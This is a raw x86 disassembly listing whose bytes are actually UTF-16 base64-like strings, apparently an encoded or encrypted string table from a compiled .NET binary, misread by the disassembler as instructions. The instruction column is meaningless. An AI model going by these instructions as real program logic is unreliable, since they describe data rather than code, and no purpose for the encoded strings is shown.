  40a3c1:	69 00 74 00 63 00    	imul   $0x630074,(%eax),%eax
  40a3c7:	6d                   	insl   (%dx),%es:(%edi)
  40a3c8:	00 59 00             	add    %bl,0x0(%ecx)
  40a3cb:	64 00 74 00 6d       	add    %dh,%fs:0x6d(%eax,%eax,1)
  40a3d0:	00 6e 00             	add    %ch,0x0(%esi)
  40a3d3:	78 00                	js     0x40a3d5
  40a3d5:	2b 00                	sub    (%eax),%eax
  40a3d7:	31 00                	xor    %eax,(%eax)
  40a3d9:	55                   	push   %ebp
  40a3da:	00 30                	add    %dh,(%eax)
  40a3dc:	00 4b 00             	add    %cl,0x0(%ebx)
  40a3df:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  40a3e3:	4e                   	dec    %esi
  40a3e4:	00 51 00             	add    %dl,0x0(%ecx)
  40a3e7:	56                   	push   %esi
  40a3e8:	00 52 00             	add    %dl,0x0(%edx)
  40a3eb:	37                   	aaa
  40a3ec:	00 31                	add    %dh,(%ecx)
  40a3ee:	00 45 00             	add    %al,0x0(%ebp)
  40a3f1:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40a3f5:	6a 00                	push   $0x0
  40a3f7:	62 00                	bound  %eax,(%eax)
  40a3f9:	43                   	inc    %ebx
  40a3fa:	00 46 00             	add    %al,0x0(%esi)
  40a3fd:	6b 00 53             	imul   $0x53,(%eax),%eax
  40a400:	00 72 00             	add    %dh,0x0(%edx)
  40a403:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40a407:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a40c:	92                   	xchg   %eax,%edx
  40a40d:	59                   	pop    %ecx
  40a40e:	54                   	push   %esp
  40a40f:	00 79 00             	add    %bh,0x0(%ecx)
  40a412:	4e                   	dec    %esi
  40a413:	00 30                	add    %dh,(%eax)
  40a415:	00 59 00             	add    %bl,0x0(%ecx)
  40a418:	57                   	push   %edi
  40a419:	00 70 00             	add    %dh,0x0(%eax)
  40a41c:	4d                   	dec    %ebp
  40a41d:	00 62 00             	add    %ah,0x0(%edx)
  40a420:	74 00                	je     0x40a422
  40a422:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40a425:	00 56 00             	add    %dl,0x0(%esi)
  40a428:	35 00 33 00 73       	xor    $0x73003300,%eax
  40a42d:	00 39                	add    %bh,(%ecx)
  40a42f:	00 69 00             	add    %ch,0x0(%ecx)
  40a432:	53                   	push   %ebx
  40a433:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40a437:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40a43b:	00 51 00             	add    %dl,0x0(%ecx)
  40a43e:	70 00                	jo     0x40a440
  40a440:	63 00                	arpl   %eax,(%eax)
  40a442:	79 00                	jns    0x40a444
  40a444:	2f                   	das
  40a445:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40a449:	00 30                	add    %dh,(%eax)
  40a44b:	00 49 00             	add    %cl,0x0(%ecx)
  40a44e:	41                   	inc    %ecx
  40a44f:	00 31                	add    %dh,(%ecx)
  40a451:	00 73 00             	add    %dh,0x0(%ebx)
  40a454:	4b                   	dec    %ebx
  40a455:	00 61 00             	add    %ah,0x0(%ecx)
  40a458:	68 00 4f 00 73       	push   $0x73004f00
  40a45d:	00 35 00 31 00 71    	add    %dh,0x71003100
  40a463:	00 56 00             	add    %dl,0x0(%esi)
  40a466:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a46a:	4b                   	dec    %ebx
  40a46b:	00 4f 00             	add    %cl,0x0(%edi)
  40a46e:	70 00                	jo     0x40a470
  40a470:	58                   	pop    %eax
  40a471:	00 61 00             	add    %ah,0x0(%ecx)
  40a474:	46                   	inc    %esi
  40a475:	00 42 00             	add    %al,0x0(%edx)
  40a478:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40a47c:	4f                   	dec    %edi
  40a47d:	00 42 00             	add    %al,0x0(%edx)
  40a480:	35 00 61 00 2f       	xor    $0x2f006100,%eax
  40a485:	00 69 00             	add    %ch,0x0(%ecx)
  40a488:	58                   	pop    %eax
  40a489:	00 4f 00             	add    %cl,0x0(%edi)
  40a48c:	42                   	inc    %edx
  40a48d:	00 46 00             	add    %al,0x0(%esi)
  40a490:	47                   	inc    %edi
  40a491:	00 6a 00             	add    %ch,0x0(%edx)
  40a494:	38 00                	cmp    %al,(%eax)
  40a496:	52                   	push   %edx
  40a497:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  40a49b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a49e:	49                   	dec    %ecx
  40a49f:	00 57 00             	add    %dl,0x0(%edi)
  40a4a2:	74 00                	je     0x40a4a4
  40a4a4:	62 00                	bound  %eax,(%eax)
  40a4a6:	6c                   	insb   (%dx),%es:(%edi)
  40a4a7:	00 39                	add    %bh,(%ecx)
  40a4a9:	00 54 00 70          	add    %dl,0x70(%eax,%eax,1)
  40a4ad:	00 63 00             	add    %ah,0x0(%ebx)
  40a4b0:	75 00                	jne    0x40a4b2
  40a4b2:	59                   	pop    %ecx
  40a4b3:	00 63 00             	add    %ah,0x0(%ebx)
  40a4b6:	2b 00                	sub    (%eax),%eax
  40a4b8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4b9:	00 69 00             	add    %ch,0x0(%ecx)
  40a4bc:	42                   	inc    %edx
  40a4bd:	00 72 00             	add    %dh,0x0(%edx)
  40a4c0:	75 00                	jne    0x40a4c2
  40a4c2:	6d                   	insl   (%dx),%es:(%edi)
  40a4c3:	00 45 00             	add    %al,0x0(%ebp)
  40a4c6:	55                   	push   %ebp
  40a4c7:	00 32                	add    %dh,(%edx)
  40a4c9:	00 2b                	add    %ch,(%ebx)
  40a4cb:	00 38                	add    %bh,(%eax)
  40a4cd:	00 53 00             	add    %dl,0x0(%ebx)
  40a4d0:	38 00                	cmp    %al,(%eax)
  40a4d2:	41                   	inc    %ecx
  40a4d3:	00 4b 00             	add    %cl,0x0(%ebx)
  40a4d6:	47                   	inc    %edi
  40a4d7:	00 37                	add    %dh,(%edi)
  40a4d9:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40a4dd:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40a4e1:	00 71 00             	add    %dh,0x0(%ecx)
  40a4e4:	43                   	inc    %ebx
  40a4e5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a4e8:	55                   	push   %ebp
  40a4e9:	00 33                	add    %dh,(%ebx)
  40a4eb:	00 61 00             	add    %ah,0x0(%ecx)
  40a4ee:	62 00                	bound  %eax,(%eax)
  40a4f0:	50                   	push   %eax
  40a4f1:	00 75 00             	add    %dh,0x0(%ebp)
  40a4f4:	5a                   	pop    %edx
  40a4f5:	00 71 00             	add    %dh,0x0(%ecx)
  40a4f8:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40a4fc:	57                   	push   %edi
  40a4fd:	00 38                	add    %bh,(%eax)
  40a4ff:	00 4d 00             	add    %cl,0x0(%ebp)
  40a502:	56                   	push   %esi
  40a503:	00 70 00             	add    %dh,0x0(%eax)
  40a506:	6b 00 65             	imul   $0x65,(%eax),%eax
  40a509:	00 70 00             	add    %dh,0x0(%eax)
  40a50c:	4f                   	dec    %edi
  40a50d:	00 50 00             	add    %dl,0x0(%eax)
  40a510:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40a514:	2f                   	das
  40a515:	00 4d 00             	add    %cl,0x0(%ebp)
  40a518:	59                   	pop    %ecx
  40a519:	00 30                	add    %dh,(%eax)
  40a51b:	00 36                	add    %dh,(%esi)
  40a51d:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  40a521:	00 57 00             	add    %dl,0x0(%edi)
  40a524:	35 00 42 00 57       	xor    $0x57004200,%eax
  40a529:	00 30                	add    %dh,(%eax)
  40a52b:	00 49 00             	add    %cl,0x0(%ecx)
  40a52e:	79 00                	jns    0x40a530
  40a530:	47                   	inc    %edi
  40a531:	00 6e 00             	add    %ch,0x0(%esi)
  40a534:	72 00                	jb     0x40a536
  40a536:	6c                   	insb   (%dx),%es:(%edi)
  40a537:	00 55 00             	add    %dl,0x0(%ebp)
  40a53a:	47                   	inc    %edi
  40a53b:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  40a53f:	00 55 00             	add    %dl,0x0(%ebp)
  40a542:	6c                   	insb   (%dx),%es:(%edi)
  40a543:	00 4b 00             	add    %cl,0x0(%ebx)
  40a546:	77 00                	ja     0x40a548
  40a548:	77 00                	ja     0x40a54a
  40a54a:	79 00                	jns    0x40a54c
  40a54c:	56                   	push   %esi
  40a54d:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40a551:	00 43 00             	add    %al,0x0(%ebx)
  40a554:	4c                   	dec    %esp
  40a555:	00 46 00             	add    %al,0x0(%esi)
  40a558:	6e                   	outsb  %ds:(%esi),(%dx)
  40a559:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  40a55d:	00 79 00             	add    %bh,0x0(%ecx)
  40a560:	32 00                	xor    (%eax),%al
  40a562:	61                   	popa
  40a563:	00 76 00             	add    %dh,0x0(%esi)
  40a566:	62 00                	bound  %eax,(%eax)
  40a568:	74 00                	je     0x40a56a
  40a56a:	4a                   	dec    %edx
  40a56b:	00 38                	add    %bh,(%eax)
  40a56d:	00 76 00             	add    %dh,0x0(%esi)
  40a570:	6d                   	insl   (%dx),%es:(%edi)
  40a571:	00 61 00             	add    %ah,0x0(%ecx)
  40a574:	63 00                	arpl   %eax,(%eax)
  40a576:	54                   	push   %esp
  40a577:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40a57b:	00 7a 00             	add    %bh,0x0(%edx)
  40a57e:	39 00                	cmp    %eax,(%eax)
  40a580:	4e                   	dec    %esi
  40a581:	00 52 00             	add    %dl,0x0(%edx)
  40a584:	2f                   	das
  40a585:	00 74 00 2f          	add    %dh,0x2f(%eax,%eax,1)
  40a589:	00 66 00             	add    %ah,0x0(%esi)
  40a58c:	2f                   	das
  40a58d:	00 35 00 62 00 4d    	add    %dh,0x4d006200
  40a593:	00 51 00             	add    %dl,0x0(%ecx)
  40a596:	4d                   	dec    %ebp
  40a597:	00 71 00             	add    %dh,0x0(%ecx)
  40a59a:	30 00                	xor    %al,(%eax)
  40a59c:	68 00 73 00 31       	push   $0x31007300
  40a5a1:	00 4f 00             	add    %cl,0x0(%edi)
  40a5a4:	77 00                	ja     0x40a5a6
  40a5a6:	62 00                	bound  %eax,(%eax)
  40a5a8:	50                   	push   %eax
  40a5a9:	00 35 00 69 00 71    	add    %dh,0x71006900
  40a5af:	00 4b 00             	add    %cl,0x0(%ebx)
  40a5b2:	44                   	inc    %esp
  40a5b3:	00 64 00 42          	add    %ah,0x42(%eax,%eax,1)
  40a5b7:	00 69 00             	add    %ch,0x0(%ecx)
  40a5ba:	2f                   	das
  40a5bb:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40a5bf:	00 65 00             	add    %ah,0x0(%ebp)
  40a5c2:	46                   	inc    %esi
  40a5c3:	00 70 00             	add    %dh,0x0(%eax)
  40a5c6:	41                   	inc    %ecx
  40a5c7:	00 77 00             	add    %dh,0x0(%edi)
  40a5ca:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5cb:	00 70 00             	add    %dh,0x0(%eax)
  40a5ce:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5cf:	00 68 00             	add    %ch,0x0(%eax)
  40a5d2:	4c                   	dec    %esp
  40a5d3:	00 30                	add    %dh,(%eax)
  40a5d5:	00 79 00             	add    %bh,0x0(%ecx)
  40a5d8:	4c                   	dec    %esp
  40a5d9:	00 35 00 38 00 48    	add    %dh,0x48003800
  40a5df:	00 59 00             	add    %bl,0x0(%ecx)
  40a5e2:	50                   	push   %eax
  40a5e3:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5e6:	6a 00                	push   $0x0
  40a5e8:	6a 00                	push   $0x0
  40a5ea:	62 00                	bound  %eax,(%eax)
  40a5ec:	72 00                	jb     0x40a5ee
  40a5ee:	4d                   	dec    %ebp
  40a5ef:	00 76 00             	add    %dh,0x0(%esi)
  40a5f2:	2f                   	das
  40a5f3:	00 45 00             	add    %al,0x0(%ebp)
  40a5f6:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40a5fa:	63 00                	arpl   %eax,(%eax)
  40a5fc:	39 00                	cmp    %eax,(%eax)
  40a5fe:	76 00                	jbe    0x40a600
  40a600:	55                   	push   %ebp
  40a601:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40a605:	00 43 00             	add    %al,0x0(%ebx)
  40a608:	76 00                	jbe    0x40a60a
  40a60a:	41                   	inc    %ecx
  40a60b:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  40a60f:	00 38                	add    %bh,(%eax)
  40a611:	00 50 00             	add    %dl,0x0(%eax)
  40a614:	33 00                	xor    (%eax),%eax
  40a616:	6f                   	outsl  %ds:(%esi),(%dx)
  40a617:	00 2f                	add    %ch,(%edi)
  40a619:	00 2f                	add    %ch,(%edi)
  40a61b:	00 50 00             	add    %dl,0x0(%eax)
  40a61e:	67 00 66 00          	add    %ah,0x0(%bp)
  40a622:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  40a626:	31 00                	xor    %eax,(%eax)
  40a628:	4a                   	dec    %edx
  40a629:	00 59 00             	add    %bl,0x0(%ecx)
  40a62c:	6a 00                	push   $0x0
  40a62e:	30 00                	xor    %al,(%eax)
  40a630:	6a 00                	push   $0x0
  40a632:	78 00                	js     0x40a634
  40a634:	4e                   	dec    %esi
  40a635:	00 51 00             	add    %dl,0x0(%ecx)
  40a638:	70 00                	jo     0x40a63a
  40a63a:	47                   	inc    %edi
  40a63b:	00 31                	add    %dh,(%ecx)
  40a63d:	00 77 00             	add    %dh,0x0(%edi)
  40a640:	63 00                	arpl   %eax,(%eax)
  40a642:	48                   	dec    %eax
  40a643:	00 75 00             	add    %dh,0x0(%ebp)
  40a646:	52                   	push   %edx
  40a647:	00 37                	add    %dh,(%edi)
  40a649:	00 6e 00             	add    %ch,0x0(%esi)
  40a64c:	4a                   	dec    %edx
  40a64d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a650:	54                   	push   %esp
  40a651:	00 68 00             	add    %ch,0x0(%eax)
  40a654:	6f                   	outsl  %ds:(%esi),(%dx)
  40a655:	00 31                	add    %dh,(%ecx)
  40a657:	00 78 00             	add    %bh,0x0(%eax)
  40a65a:	4c                   	dec    %esp
  40a65b:	00 32                	add    %dh,(%edx)
  40a65d:	00 36                	add    %dh,(%esi)
  40a65f:	00 35 00 67 00 68    	add    %dh,0x68006700
  40a665:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40a669:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40a66d:	00 7a 00             	add    %bh,0x0(%edx)
  40a670:	38 00                	cmp    %al,(%eax)
  40a672:	52                   	push   %edx
  40a673:	00 6d 00             	add    %ch,0x0(%ebp)
  40a676:	53                   	push   %ebx
  40a677:	00 55 00             	add    %dl,0x0(%ebp)
  40a67a:	75 00                	jne    0x40a67c
  40a67c:	68 00 41 00 41       	push   $0x41004100
  40a681:	00 37                	add    %dh,(%edi)
  40a683:	00 44 00 47          	add    %al,0x47(%eax,%eax,1)
  40a687:	00 73 00             	add    %dh,0x0(%ebx)
  40a68a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a68b:	00 66 00             	add    %ah,0x0(%esi)
  40a68e:	6a 00                	push   $0x0
  40a690:	56                   	push   %esi
  40a691:	00 4d 00             	add    %cl,0x0(%ebp)
  40a694:	78 00                	js     0x40a696
  40a696:	69 00 33 00 76 00    	imul   $0x760033,(%eax),%eax
  40a69c:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40a6a0:	42                   	inc    %edx
  40a6a1:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a6a5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a6a8:	70 00                	jo     0x40a6aa
  40a6aa:	58                   	pop    %eax
  40a6ab:	00 69 00             	add    %ch,0x0(%ecx)
  40a6ae:	55                   	push   %ebp
  40a6af:	00 38                	add    %bh,(%eax)
  40a6b1:	00 56 00             	add    %dl,0x0(%esi)
  40a6b4:	71 00                	jno    0x40a6b6
  40a6b6:	45                   	inc    %ebp
  40a6b7:	00 33                	add    %dh,(%ebx)
  40a6b9:	00 2b                	add    %ch,(%ebx)
  40a6bb:	00 39                	add    %bh,(%ecx)
  40a6bd:	00 70 00             	add    %dh,0x0(%eax)
  40a6c0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6c1:	00 73 00             	add    %dh,0x0(%ebx)
  40a6c4:	71 00                	jno    0x40a6c6
  40a6c6:	6b 00 42             	imul   $0x42,(%eax),%eax
  40a6c9:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40a6cd:	00 48 00             	add    %cl,0x0(%eax)
  40a6d0:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40a6d4:	74 00                	je     0x40a6d6
  40a6d6:	2f                   	das
  40a6d7:	00 68 00             	add    %ch,0x0(%eax)
  40a6da:	7a 00                	jp     0x40a6dc
  40a6dc:	58                   	pop    %eax
  40a6dd:	00 4e 00             	add    %cl,0x0(%esi)
  40a6e0:	37                   	aaa
  40a6e1:	00 41 00             	add    %al,0x0(%ecx)
  40a6e4:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40a6e8:	73 00                	jae    0x40a6ea
  40a6ea:	4c                   	dec    %esp
  40a6eb:	00 69 00             	add    %ch,0x0(%ecx)
  40a6ee:	45                   	inc    %ebp
  40a6ef:	00 50 00             	add    %dl,0x0(%eax)
  40a6f2:	4e                   	dec    %esi
  40a6f3:	00 59 00             	add    %bl,0x0(%ecx)
  40a6f6:	76 00                	jbe    0x40a6f8
  40a6f8:	56                   	push   %esi
  40a6f9:	00 33                	add    %dh,(%ebx)
  40a6fb:	00 67 00             	add    %ah,0x0(%edi)
  40a6fe:	48                   	dec    %eax
  40a6ff:	00 4f 00             	add    %cl,0x0(%edi)
  40a702:	47                   	inc    %edi
  40a703:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40a707:	00 4f 00             	add    %cl,0x0(%edi)
  40a70a:	72 00                	jb     0x40a70c
  40a70c:	70 00                	jo     0x40a70e
  40a70e:	51                   	push   %ecx
  40a70f:	00 4a 00             	add    %cl,0x0(%edx)
  40a712:	56                   	push   %esi
  40a713:	00 2f                	add    %ch,(%edi)
  40a715:	00 46 00             	add    %al,0x0(%esi)
  40a718:	61                   	popa
  40a719:	00 62 00             	add    %ah,0x0(%edx)
  40a71c:	4d                   	dec    %ebp
  40a71d:	00 69 00             	add    %ch,0x0(%ecx)
  40a720:	66 00 37             	data16 add %dh,(%edi)
  40a723:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40a727:	00 33                	add    %dh,(%ebx)
  40a729:	00 45 00             	add    %al,0x0(%ebp)
  40a72c:	52                   	push   %edx
  40a72d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a730:	6d                   	insl   (%dx),%es:(%edi)
  40a731:	00 73 00             	add    %dh,0x0(%ebx)
  40a734:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40a738:	34 00                	xor    $0x0,%al
  40a73a:	57                   	push   %edi
  40a73b:	00 70 00             	add    %dh,0x0(%eax)
  40a73e:	55                   	push   %ebp
  40a73f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a742:	70 00                	jo     0x40a744
  40a744:	72 00                	jb     0x40a746
  40a746:	33 00                	xor    (%eax),%eax
  40a748:	6c                   	insb   (%dx),%es:(%edi)
  40a749:	00 2b                	add    %ch,(%ebx)
  40a74b:	00 56 00             	add    %dl,0x0(%esi)
  40a74e:	5a                   	pop    %edx
  40a74f:	00 33                	add    %dh,(%ebx)
  40a751:	00 49 00             	add    %cl,0x0(%ecx)
  40a754:	6f                   	outsl  %ds:(%esi),(%dx)
  40a755:	00 4d 00             	add    %cl,0x0(%ebp)
  40a758:	6b 00 68             	imul   $0x68,(%eax),%eax
  40a75b:	00 48 00             	add    %cl,0x0(%eax)
  40a75e:	2f                   	das
  40a75f:	00 4a 00             	add    %cl,0x0(%edx)
  40a762:	45                   	inc    %ebp
  40a763:	00 77 00             	add    %dh,0x0(%edi)
  40a766:	32 00                	xor    (%eax),%al
  40a768:	6f                   	outsl  %ds:(%esi),(%dx)
  40a769:	00 54 00 4b          	add    %dl,0x4b(%eax,%eax,1)
  40a76d:	00 50 00             	add    %dl,0x0(%eax)
  40a770:	47                   	inc    %edi
  40a771:	00 69 00             	add    %ch,0x0(%ecx)
  40a774:	61                   	popa
  40a775:	00 51 00             	add    %dl,0x0(%ecx)
  40a778:	4a                   	dec    %edx
  40a779:	00 6f 00             	add    %ch,0x0(%edi)
  40a77c:	39 00                	cmp    %eax,(%eax)
  40a77e:	7a 00                	jp     0x40a780
  40a780:	41                   	inc    %ecx
  40a781:	00 6a 00             	add    %ch,0x0(%edx)
  40a784:	30 00                	xor    %al,(%eax)
  40a786:	4b                   	dec    %ebx
  40a787:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  40a78b:	00 78 00             	add    %bh,0x0(%eax)
  40a78e:	75 00                	jne    0x40a790
  40a790:	76 00                	jbe    0x40a792
  40a792:	5a                   	pop    %edx
  40a793:	00 71 00             	add    %dh,0x0(%ecx)
  40a796:	72 00                	jb     0x40a798
  40a798:	69 00 59 00 71 00    	imul   $0x710059,(%eax),%eax
  40a79e:	39 00                	cmp    %eax,(%eax)
  40a7a0:	51                   	push   %ecx
  40a7a1:	00 33                	add    %dh,(%ebx)
  40a7a3:	00 49 00             	add    %cl,0x0(%ecx)
  40a7a6:	58                   	pop    %eax
  40a7a7:	00 38                	add    %bh,(%eax)
  40a7a9:	00 62 00             	add    %ah,0x0(%edx)
  40a7ac:	77 00                	ja     0x40a7ae
  40a7ae:	50                   	push   %eax
  40a7af:	00 41 00             	add    %al,0x0(%ecx)
  40a7b2:	32 00                	xor    (%eax),%al
  40a7b4:	79 00                	jns    0x40a7b6
  40a7b6:	49                   	dec    %ecx
  40a7b7:	00 2b                	add    %ch,(%ebx)
  40a7b9:	00 73 00             	add    %dh,0x0(%ebx)
  40a7bc:	71 00                	jno    0x40a7be
  40a7be:	36 00 33             	add    %dh,%ss:(%ebx)
  40a7c1:	00 36                	add    %dh,(%esi)
  40a7c3:	00 6e 00             	add    %ch,0x0(%esi)
  40a7c6:	4b                   	dec    %ebx
  40a7c7:	00 37                	add    %dh,(%edi)
  40a7c9:	00 4f 00             	add    %cl,0x0(%edi)
  40a7cc:	6c                   	insb   (%dx),%es:(%edi)
  40a7cd:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7d0:	31 00                	xor    %eax,(%eax)
  40a7d2:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40a7d6:	41                   	inc    %ecx
  40a7d7:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7da:	34 00                	xor    $0x0,%al
  40a7dc:	41                   	inc    %ecx
  40a7dd:	00 43 00             	add    %al,0x0(%ebx)
  40a7e0:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40a7e4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7e5:	00 76 00             	add    %dh,0x0(%esi)
  40a7e8:	6c                   	insb   (%dx),%es:(%edi)
  40a7e9:	00 41 00             	add    %al,0x0(%ecx)
  40a7ec:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40a7f0:	51                   	push   %ecx
  40a7f1:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40a7f5:	00 33                	add    %dh,(%ebx)
  40a7f7:	00 6a 00             	add    %ch,0x0(%edx)
  40a7fa:	6c                   	insb   (%dx),%es:(%edi)
  40a7fb:	00 42 00             	add    %al,0x0(%edx)
  40a7fe:	78 00                	js     0x40a800
  40a800:	39 00                	cmp    %eax,(%eax)
  40a802:	4f                   	dec    %edi
  40a803:	00 4e 00             	add    %cl,0x0(%esi)
  40a806:	75 00                	jne    0x40a808
  40a808:	4e                   	dec    %esi
  40a809:	00 73 00             	add    %dh,0x0(%ebx)
  40a80c:	4a                   	dec    %edx
  40a80d:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40a811:	00 76 00             	add    %dh,0x0(%esi)
  40a814:	41                   	inc    %ecx
  40a815:	00 6a 00             	add    %ch,0x0(%edx)
  40a818:	49                   	dec    %ecx
  40a819:	00 4c 00 35          	add    %cl,0x35(%eax,%eax,1)
  40a81d:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a821:	00 31                	add    %dh,(%ecx)
  40a823:	00 57 00             	add    %dl,0x0(%edi)
  40a826:	74 00                	je     0x40a828
  40a828:	53                   	push   %ebx
  40a829:	00 76 00             	add    %dh,0x0(%esi)
  40a82c:	78 00                	js     0x40a82e
  40a82e:	42                   	inc    %edx
  40a82f:	00 36                	add    %dh,(%esi)
  40a831:	00 52 00             	add    %dl,0x0(%edx)
  40a834:	70 00                	jo     0x40a836
  40a836:	56                   	push   %esi
  40a837:	00 55 00             	add    %dl,0x0(%ebp)
  40a83a:	74 00                	je     0x40a83c
  40a83c:	67 00 45 00          	add    %al,0x0(%di)
  40a840:	36 00 39             	add    %bh,%ss:(%ecx)
  40a843:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40a847:	00 67 00             	add    %ah,0x0(%edi)
  40a84a:	62 00                	bound  %eax,(%eax)
  40a84c:	6a 00                	push   $0x0
  40a84e:	78 00                	js     0x40a850
  40a850:	56                   	push   %esi
  40a851:	00 4f 00             	add    %cl,0x0(%edi)
  40a854:	48                   	dec    %eax
  40a855:	00 4f 00             	add    %cl,0x0(%edi)
  40a858:	5a                   	pop    %edx
  40a859:	00 66 00             	add    %ah,0x0(%esi)
  40a85c:	38 00                	cmp    %al,(%eax)
  40a85e:	37                   	aaa
  40a85f:	00 74 00 45          	add    %dh,0x45(%eax,%eax,1)
  40a863:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a867:	00 69 00             	add    %ch,0x0(%ecx)
  40a86a:	76 00                	jbe    0x40a86c
  40a86c:	38 00                	cmp    %al,(%eax)
  40a86e:	39 00                	cmp    %eax,(%eax)
  40a870:	44                   	inc    %esp
  40a871:	00 4d 00             	add    %cl,0x0(%ebp)
  40a874:	76 00                	jbe    0x40a876
  40a876:	57                   	push   %edi
  40a877:	00 61 00             	add    %ah,0x0(%ecx)
  40a87a:	79 00                	jns    0x40a87c
  40a87c:	49                   	dec    %ecx
  40a87d:	00 77 00             	add    %dh,0x0(%edi)
  40a880:	43                   	inc    %ebx
  40a881:	00 75 00             	add    %dh,0x0(%ebp)
  40a884:	67 00 75 00          	add    %dh,0x0(%di)
  40a888:	6e                   	outsb  %ds:(%esi),(%dx)
  40a889:	00 6b 00             	add    %ch,0x0(%ebx)
  40a88c:	30 00                	xor    %al,(%eax)
  40a88e:	2b 00                	sub    (%eax),%eax
  40a890:	56                   	push   %esi
  40a891:	00 61 00             	add    %ah,0x0(%ecx)
  40a894:	6c                   	insb   (%dx),%es:(%edi)
  40a895:	00 4b 00             	add    %cl,0x0(%ebx)
  40a898:	6d                   	insl   (%dx),%es:(%edi)
  40a899:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  40a89d:	00 37                	add    %dh,(%edi)
  40a89f:	00 6f 00             	add    %ch,0x0(%edi)
  40a8a2:	62 00                	bound  %eax,(%eax)
  40a8a4:	74 00                	je     0x40a8a6
  40a8a6:	4f                   	dec    %edi
  40a8a7:	00 43 00             	add    %al,0x0(%ebx)
  40a8aa:	56                   	push   %esi
  40a8ab:	00 67 00             	add    %ah,0x0(%edi)
  40a8ae:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8af:	00 32                	add    %dh,(%edx)
  40a8b1:	00 4b 00             	add    %cl,0x0(%ebx)
  40a8b4:	4d                   	dec    %ebp
  40a8b5:	00 55 00             	add    %dl,0x0(%ebp)
  40a8b8:	78 00                	js     0x40a8ba
  40a8ba:	79 00                	jns    0x40a8bc
  40a8bc:	7a 00                	jp     0x40a8be
  40a8be:	51                   	push   %ecx
  40a8bf:	00 71 00             	add    %dh,0x0(%ecx)
  40a8c2:	70 00                	jo     0x40a8c4
  40a8c4:	4b                   	dec    %ebx
  40a8c5:	00 32                	add    %dh,(%edx)
  40a8c7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8ca:	6c                   	insb   (%dx),%es:(%edi)
  40a8cb:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8ce:	30 00                	xor    %al,(%eax)
  40a8d0:	61                   	popa
  40a8d1:	00 66 00             	add    %ah,0x0(%esi)
  40a8d4:	65 00 2f             	add    %ch,%gs:(%edi)
  40a8d7:	00 2f                	add    %ch,(%edi)
  40a8d9:	00 66 00             	add    %ah,0x0(%esi)
  40a8dc:	37                   	aaa
  40a8dd:	00 36                	add    %dh,(%esi)
  40a8df:	00 52 00             	add    %dl,0x0(%edx)
  40a8e2:	39 00                	cmp    %eax,(%eax)
  40a8e4:	77 00                	ja     0x40a8e6
  40a8e6:	47                   	inc    %edi
  40a8e7:	00 63 00             	add    %ah,0x0(%ebx)
  40a8ea:	43                   	inc    %ebx
  40a8eb:	00 4f 00             	add    %cl,0x0(%edi)
  40a8ee:	62 00                	bound  %eax,(%eax)
  40a8f0:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40a8f4:	78 00                	js     0x40a8f6
  40a8f6:	78 00                	js     0x40a8f8
  40a8f8:	78 00                	js     0x40a8fa
  40a8fa:	32 00                	xor    (%eax),%al
